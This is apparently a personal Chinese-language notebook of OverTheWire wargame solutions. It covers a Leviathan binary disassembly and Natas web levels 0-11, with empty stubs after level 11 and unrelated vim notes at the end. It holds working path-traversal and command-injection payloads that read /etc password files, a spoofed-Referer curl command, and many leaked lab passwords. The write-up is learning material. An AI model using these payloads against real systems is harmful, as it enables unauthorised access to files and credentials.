 804911a:	66 90                	xchg   %ax,%ax
 804911c:	66 90                	xchg   %ax,%ax
 804911e:	66 90                	xchg   %ax,%ax

08049120 &lt;deregister_tm_clones&gt;:
 8049120:	b8 34 c0 04 08       	mov    $0x804c034,%eax
 8049125:	3d 34 c0 04 08       	cmp    $0x804c034,%eax
 804912a:	74 24                	je     8049150 &lt;deregister_tm_clones+0x30&gt;
 804912c:	b8 00 00 00 00       	mov    $0x0,%eax
 8049131:	85 c0                	test   %eax,%eax
 8049133:	74 1b                	je     8049150 &lt;deregister_tm_clones+0x30&gt;
 8049135:	55                   	push   %ebp
 8049136:	89 e5                	mov    %esp,%ebp
 8049138:	83 ec 14             	sub    $0x14,%esp
 804913b:	68 34 c0 04 08       	push   $0x804c034
 8049140:	ff d0                	call   *%eax
 8049142:	83 c4 10             	add    $0x10,%esp
 8049145:	c9                   	leave
 8049146:	c3                   	ret
 8049147:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 804914e:	66 90                	xchg   %ax,%ax
 8049150:	c3                   	ret
 8049151:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 8049158:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 804915f:	90                   	nop

08049160 &lt;register_tm_clones&gt;:
 8049160:	b8 34 c0 04 08       	mov    $0x804c034,%eax
 8049165:	2d 34 c0 04 08       	sub    $0x804c034,%eax
 804916a:	89 c2                	mov    %eax,%edx
 804916c:	c1 e8 1f             	shr    $0x1f,%eax
 804916f:	c1 fa 02             	sar    $0x2,%edx
 8049172:	01 d0                	add    %edx,%eax
 8049174:	d1 f8                	sar    %eax
 8049176:	74 20                	je     8049198 &lt;register_tm_clones+0x38&gt;
 8049178:	ba 00 00 00 00       	mov    $0x0,%edx
 804917d:	85 d2                	test   %edx,%edx
 804917f:	74 17                	je     8049198 &lt;register_tm_clones+0x38&gt;
 8049181:	55                   	push   %ebp
 8049182:	89 e5                	mov    %esp,%ebp
 8049184:	83 ec 10             	sub    $0x10,%esp
 8049187:	50                   	push   %eax
 8049188:	68 34 c0 04 08       	push   $0x804c034
 804918d:	ff d2                	call   *%edx
 804918f:	83 c4 10             	add    $0x10,%esp
 8049192:	c9                   	leave
 8049193:	c3                   	ret
 8049194:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 8049198:	c3                   	ret
 8049199:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

080491a0 &lt;__do_global_dtors_aux&gt;:
 80491a0:	f3 0f 1e fb          	endbr32
 80491a4:	80 3d 34 c0 04 08 00 	cmpb   $0x0,0x804c034
 80491ab:	75 1b                	jne    80491c8 &lt;__do_global_dtors_aux+0x28&gt;
 80491ad:	55                   	push   %ebp
 80491ae:	89 e5                	mov    %esp,%ebp
 80491b0:	83 ec 08             	sub    $0x8,%esp
 80491b3:	e8 68 ff ff ff       	call   8049120 &lt;deregister_tm_clones&gt;
 80491b8:	c6 05 34 c0 04 08 01 	movb   $0x1,0x804c034
 80491bf:	c9                   	leave
 80491c0:	c3                   	ret
 80491c1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 80491c8:	c3                   	ret
 80491c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

080491d0 &lt;frame_dummy&gt;:
 80491d0:	f3 0f 1e fb          	endbr32
 80491d4:	eb 8a                	jmp    8049160 &lt;register_tm_clones&gt;

080491d6 &lt;main&gt;:
 80491d6:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 80491da:	83 e4 f0             	and    $0xfffffff0,%esp
 80491dd:	ff 71 fc             	push   -0x4(%ecx)
 80491e0:	55                   	push   %ebp
 80491e1:	89 e5                	mov    %esp,%ebp
 80491e3:	53                   	push   %ebx
 80491e4:	51                   	push   %ecx
 80491e5:	83 ec 10             	sub    $0x10,%esp
 80491e8:	89 c8                	mov    %ecx,%eax
 80491ea:	c7 45 f4 d3 1b 00 00 	movl   $0x1bd3,-0xc(%ebp)
 80491f1:	83 38 02             	cmpl   $0x2,(%eax)
 80491f4:	74 20                	je     8049216 &lt;main+0x40&gt;
 80491f6:	8b 40 04             	mov    0x4(%eax),%eax
 80491f9:	8b 00                	mov    (%eax),%eax
 80491fb:	83 ec 08             	sub    $0x8,%esp
 80491fe:	50                   	push   %eax
 80491ff:	68 08 a0 04 08       	push   $0x804a008
 8049204:	e8 47 fe ff ff       	call   8049050 &lt;printf@plt&gt;
 8049209:	83 c4 10             	add    $0x10,%esp
 804920c:	83 ec 0c             	sub    $0xc,%esp
 804920f:	6a ff                	push   $0xffffffff
 8049211:	e8 7a fe ff ff       	call   8049090 &lt;exit@plt&gt;
 8049216:	8b 40 04             	mov    0x4(%eax),%eax
 8049219:	83 c0 04             	add    $0x4,%eax
 804921c:	8b 00                	mov    (%eax),%eax
 804921e:	83 ec 0c             	sub    $0xc,%esp
 8049221:	50                   	push   %eax
 8049222:	e8 89 fe ff ff       	call   80490b0 &lt;atoi@plt&gt;
 8049227:	83 c4 10             	add    $0x10,%esp
 804922a:	39 45 f4             	cmp    %eax,-0xc(%ebp)
 804922d:	75 2b                	jne    804925a &lt;main+0x84&gt;
 804922f:	e8 2c fe ff ff       	call   8049060 &lt;geteuid@plt&gt;
 8049234:	89 c3                	mov    %eax,%ebx
 8049236:	e8 25 fe ff ff       	call   8049060 &lt;geteuid@plt&gt;
 804923b:	83 ec 08             	sub    $0x8,%esp
 804923e:	53                   	push   %ebx
 804923f:	50                   	push   %eax
 8049240:	e8 5b fe ff ff       	call   80490a0 &lt;setreuid@plt&gt;
 8049245:	83 c4 10             	add    $0x10,%esp
 8049248:	83 ec 0c             	sub    $0xc,%esp
 804924b:	68 22 a0 04 08       	push   $0x804a022
 8049250:	e8 2b fe ff ff       	call   8049080 &lt;system@plt&gt;
 8049255:	83 c4 10             	add    $0x10,%esp
 8049258:	eb 10                	jmp    804926a &lt;main+0x94&gt;
 804925a:	83 ec 0c             	sub    $0xc,%esp
 804925d:	68 2a a0 04 08       	push   $0x804a02a
 8049262:	e8 09 fe ff ff       	call   8049070 &lt;puts@plt&gt;
 8049267:	83 c4 10             	add    $0x10,%esp
 804926a:	b8 00 00 00 00       	mov    $0x0,%eax
 804926f:	8d 65 f8             	lea    -0x8(%ebp),%esp
 8049272:	59                   	pop    %ecx
 8049273:	5b                   	pop    %ebx
 8049274:	5d                   	pop    %ebp
 8049275:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8049278:	c3                   	ret

Disassembly of section .fini:

0804927c &lt;_fini&gt;:
 804927c:	f3 0f 1e fb          	endbr32
 8049280:	53                   	push   %ebx
 8049281:	83 ec 08             	sub    $0x8,%esp
 8049284:	e8 87 fe ff ff       	call   8049110 &lt;__x86.get_pc_thunk.bx&gt;
 8049289:	81 c3 77 2d 00 00    	add    $0x2d77,%ebx
 804928f:	83 c4 08             	add    $0x8,%esp
 8049292:	5b                   	pop    %ebx
 8049293:	c3                   	ret
</code></pre>
<p>还是movl这一句找立即数</p>
<pre><code>80491ea:	c7 45 f4 d3 1b 00 00 	movl   $0x1bd3,-0xc(%ebp)
</code></pre>
<p>0x1bd3换算一下是7123
然后得到密码</p>
<pre><code>leviathan6@gibson:~$ ./leviathan6 7123
$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
$
</code></pre>
<p>进彩蛋</p>
<pre><code>leviathan7@gibson:~$ ll
total 24
drwxr-xr-x  2 root       root       4096 Apr 23 18:05 ./
drwxr-xr-x 83 root       root       4096 Apr 23 18:06 ../
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-r--r-----  1 leviathan7 leviathan7  178 Apr 23 18:05 CONGRATULATIONS
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile
leviathan7@gibson:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
leviathan7@gibson:~$
</code></pre>
<p>这玩意儿，里面有大量的东西可不是linux操作啊，这里面有阅读汇编的内容的事儿，可底层。。。</p>
<p><strong>被骗的很惨啊，这里面要会的linux是不是指RHCA那种，那可真屌</strong></p>
<p><em>咋回事儿，人家不让传答案，az，反正我没啥流量，就传了吧。。。</em></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level0-2"><a class="header" href="#level0-2">level0</a></h1>
<p>直接登录，然后查看网页源代码
<img src="WarGame/image-2.png" alt="level0" /></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas0&quot;, &quot;pass&quot;: &quot;natas0&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas0&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;
You can find the password for the next level on this page.

&lt;!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h1 id="level1-6"><a class="header" href="#level1-6">level1</a></h1>
<p>不让右键了
<img src="WarGame/image-3.png" alt="level1" />
那就按F12啊
<img src="WarGame/image-4.png" alt="level1" /></p>
<pre><code>&lt;!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 --&gt;
</code></pre>
<h1 id="level2-6"><a class="header" href="#level2-6">level2</a></h1>
<p>说啥也没有
<img src="WarGame/image-5.png" alt="level2" />
还是看源码</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas2&quot;, &quot;pass&quot;: &quot;h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas2&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;
There is nothing on this page
&lt;img src=&quot;files/pixel.png&quot;&gt;
&lt;/div&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>有个图片，点进去看，进父目录</p>
<pre><code>http://natas2.natas.labs.overthewire.org/files/

</code></pre>
<p><img src="WarGame/image-6.png" alt="level2" />
得到密码</p>
<pre><code># username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
</code></pre>
<h1 id="level3-5"><a class="header" href="#level3-5">level3</a></h1>
<p>源代码啥也没有，很G</p>
<pre><code>
&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas3&quot;, &quot;pass&quot;: &quot;G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas3&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;
There is nothing on this page
&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;
&lt;/div&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>谷歌搜不到？我必应来搜！
<img src="WarGame/image-7.png" alt="level3" />
进去是一个和level2一样的界面，解决了。。。</p>
<pre><code>natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
</code></pre>
<p>这个题需要知道<code>site:</code>这个高级搜索用法</p>
<h1 id="level4-5"><a class="header" href="#level4-5">level4</a></h1>
<p><img src="WarGame/image-8.png" alt="level4" /></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas4&quot;, &quot;pass&quot;: &quot;tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas4&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;

Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &quot;http://natas5.natas.labs.overthewire.org/&quot;
&lt;br/&gt;
&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Refresh page&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>然后一条命令解决</p>
<pre><code>C:\Users\&gt;curl -e &quot;http://natas5.natas.labs.overthewire.org/&quot; -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm &quot;http://natas4.natas.labs.overthewire.org/&quot;
&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas4&quot;, &quot;pass&quot;: &quot;tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas4&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;

Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
&lt;br/&gt;
&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Refresh page&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

C:\Users\&gt;
</code></pre>
<p>另一种方法则是使用burpsuite,自己发包</p>
<h1 id="level5-5"><a class="header" href="#level5-5">level5</a></h1>
<p>发现需要cookie
<img src="WarGame/image-9.png" alt="level5" />
那么随便改改也就解决了
<img src="WarGame/image-10.png" alt="level6" /></p>
<pre><code>Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
</code></pre>
<h1 id="level6-5"><a class="header" href="#level6-5">level6</a></h1>
<p>进来可以看源代码</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas6&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas6&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;

&lt;?

include &quot;includes/secret.inc&quot;;

    if(array_key_exists(&quot;submit&quot;, $_POST)) {
        if($secret == $_POST['secret']) {
        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;
    } else {
        print &quot;Wrong secret&quot;;
    }
    }
?&gt;

&lt;form method=post&gt;
Input secret: &lt;input name=secret&gt;&lt;br&gt;
&lt;input type=submit name=submit&gt;
&lt;/form&gt;

&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>这里与密钥有一个是否相同的判断，那么直接访问那个网址<code>includes/secret.inc</code>，得到密钥</p>
<pre><code>&lt;?
$secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;;
?&gt;
</code></pre>
<p>然后输入，得到密码</p>
<pre><code>Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
</code></pre>
<h1 id="level7-4"><a class="header" href="#level7-4">level7</a></h1>
<p>登录后源码</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas7&quot;, &quot;pass&quot;: &quot;jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr&quot; };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas7&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;

&lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt;
&lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;
&lt;br&gt;
&lt;br&gt;

&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>这个提示，很有这个网站的风格。。。</p>
<pre><code># 访问网址http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
# 密钥
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
</code></pre>
<h1 id="level8-3"><a class="header" href="#level8-3">level8</a></h1>
<p>核心在下边儿</p>
<pre><code>
&lt;?

$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists(&quot;submit&quot;, $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;
    } else {
    print &quot;Wrong secret&quot;;
    }
}
?&gt;
</code></pre>
<p>strrev函数的<a href="https://www.runoob.com/php/func-string-strrev.html">说明</a>，就是反转字符串。</p>
<p>因此，建议找一些在线小工具做下面的操作</p>
<pre><code>&lt;?php
echo base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c315669563362&quot;)));
?&gt;
</code></pre>
<p>输出结果后，得到密钥</p>
<pre><code>Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
</code></pre>
<h1 id="level9-3"><a class="header" href="#level9-3">level9</a></h1>
<pre><code>&lt;?
$key = &quot;&quot;;

if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
    $key = $_REQUEST[&quot;needle&quot;];
}

if($key != &quot;&quot;) {
    passthru(&quot;grep -i $key dictionary.txt&quot;);
}
?&gt;
</code></pre>
<p>直接命令注入</p>
<pre><code>输入;cat /etc/natas_webpass/natas10
</code></pre>
<p>得到密钥</p>
<pre><code>D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
</code></pre>
<h1 id="level10-3"><a class="header" href="#level10-3">level10</a></h1>
<p>他们学聪明了</p>
<pre><code>&lt;?
$key = &quot;&quot;;

if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
    $key = $_REQUEST[&quot;needle&quot;];
}

if($key != &quot;&quot;) {
    if(preg_match('/[;|&amp;]/',$key)) {
        print &quot;Input contains an illegal character!&quot;;
    } else {
        passthru(&quot;grep -i $key dictionary.txt&quot;);
    }
}
?&gt;
</code></pre>
<p>就是写正则，水的</p>
<pre><code>[a-zA-Z] /etc/natas_webpass/natas11 #
[[:alpha:]] /etc/natas_webpass/natas11 #
</code></pre>
<pre><code>1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
</code></pre>
<h1 id="level11-3"><a class="header" href="#level11-3">level11</a></h1>
<p>代码审计工作如下：</p>
<pre><code>&lt;?

$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);

function xor_encrypt($in) {
    $key = '&lt;censored&gt;';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i&lt;strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists(&quot;data&quot;, $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);
    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?&gt;
</code></pre>
<h1 id="level12-3"><a class="header" href="#level12-3">level12</a></h1>
<pre><code>
</code></pre>
<h1 id="level13-3"><a class="header" href="#level13-3">level13</a></h1>
<pre><code>
</code></pre>
<h1 id="level14-3"><a class="header" href="#level14-3">level14</a></h1>
<pre><code>
</code></pre>
<h1 id="level15-3"><a class="header" href="#level15-3">level15</a></h1>
<pre><code>
</code></pre>
<h1 id="level16-3"><a class="header" href="#level16-3">level16</a></h1>
<pre><code>
</code></pre>
<h1 id="level17-3"><a class="header" href="#level17-3">level17</a></h1>
<pre><code>
</code></pre>
<h1 id="level18-3"><a class="header" href="#level18-3">level18</a></h1>
<pre><code>
</code></pre>
<h1 id="level19-3"><a class="header" href="#level19-3">level19</a></h1>
<pre><code>
</code></pre>
<h1 id="level20-3"><a class="header" href="#level20-3">level20</a></h1>
<pre><code>
</code></pre>
<h1 id="level21-3"><a class="header" href="#level21-3">level21</a></h1>
<pre><code>
</code></pre>
<h1 id="level21-4"><a class="header" href="#level21-4">level21</a></h1>
<pre><code>
</code></pre>
<h1 id="level23-3"><a class="header" href="#level23-3">level23</a></h1>
<pre><code>
</code></pre>
<h1 id="level24-3"><a class="header" href="#level24-3">level24</a></h1>
<pre><code>
</code></pre>
<h1 id="level25-3"><a class="header" href="#level25-3">level25</a></h1>
<pre><code>
</code></pre>
<h1 id="level26-3"><a class="header" href="#level26-3">level26</a></h1>
<pre><code>
</code></pre>
<h1 id="level27-3"><a class="header" href="#level27-3">level27</a></h1>
<pre><code>
</code></pre>
<h1 id="level28-3"><a class="header" href="#level28-3">level28</a></h1>
<pre><code>
</code></pre>
<h1 id="level29-3"><a class="header" href="#level29-3">level29</a></h1>
<pre><code>
</code></pre>
<h1 id="level30-3"><a class="header" href="#level30-3">level30</a></h1>
<pre><code>
</code></pre>
<h1 id="level31-3"><a class="header" href="#level31-3">level31</a></h1>
<pre><code>
</code></pre>
<h1 id="level32-3"><a class="header" href="#level32-3">level32</a></h1>
<pre><code>
</code></pre>
<h1 id="level33-3"><a class="header" href="#level33-3">level33</a></h1>
<pre><code>
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="why-i-write-this"><a class="header" href="#why-i-write-this">WHY I WRITE THIS?</a></h1>
<p>在pwn.college之中，反正由于我网不行，那个图形化界面儿我特别卡，我基本上能不用我就不用，一开始搞那个wireshark差点儿卡破防了。另外一个原因我写在了cse365的wp里面，就是涉及到只有在同一个进程下才能监听这件事。因此，tmux和vim又提上日程了。当然，最重要的原因是，我希望把vim搞成一个好用的IDE。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tmux"><a class="header" href="#tmux">TMUX</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vim实用技巧"><a class="header" href="#vim实用技巧">Vim实用技巧</a></h1>
<p><strong>这本书应该反复看、反复看、反复看！</strong></p>
<h2 id="basic"><a class="header" href="#basic">basic</a></h2>
<p>首先你需要会一些基础性的操作</p>
<h2 id="技巧1"><a class="header" href="#技巧1">技巧1</a></h2>
<p>使用<code>.</code>命令来重复</p>
<h2 id="技巧2"><a class="header" href="#技巧2">技巧2</a></h2>
<p>很多Vim的单键命令都可以被看成两个或多个其他命令的组合</p>
<h2 id="技巧3"><a class="header" href="#技巧3">技巧3</a></h2>
<p>f查找，s删除，分号会继续查找</p>
<h2 id="技巧4"><a class="header" href="#技巧4">技巧4</a></h2>
<div class="table-wrapper"><table><thead><tr><th>目的</th><th>操作</th><th>重复</th><th>回退</th></tr></thead><tbody>
<tr><td>做出一个修改</td><td>{edit}</td><td>.</td><td>u</td></tr>
<tr><td>在行内查找下一指定字符</td><td>f{char}/t{char}</td><td>;</td><td>,</td></tr>
<tr><td>在行内查找上一指定字符</td><td>F{char}/T{char}</td><td>;</td><td>,</td></tr>
